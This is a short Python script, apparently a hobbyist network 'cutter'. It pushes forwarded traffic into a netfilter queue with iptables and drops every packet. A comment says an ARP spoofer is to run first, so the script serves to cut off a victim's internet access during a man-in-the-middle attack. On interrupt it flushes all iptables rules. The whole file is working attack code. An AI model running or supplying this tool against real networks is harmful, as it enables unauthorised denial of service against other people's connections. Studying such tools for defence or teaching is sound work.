#!/usr/bin/env python3
import netfilterqueue
import subprocess

n_packets = 0


def process_packet(packet):
    global n_packets
    n_packets = n_packets + 1
    packet.drop()
    print("\r" + str(n_packets) + " packets dropped", end="")


try:
    # Execute first the arp spoofer
    # trap the incoming packets to a queue: iptables -I FORWARD -j NFQUEUE queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("closing cutter")
    subprocess.call("iptables --flush", shell=True)
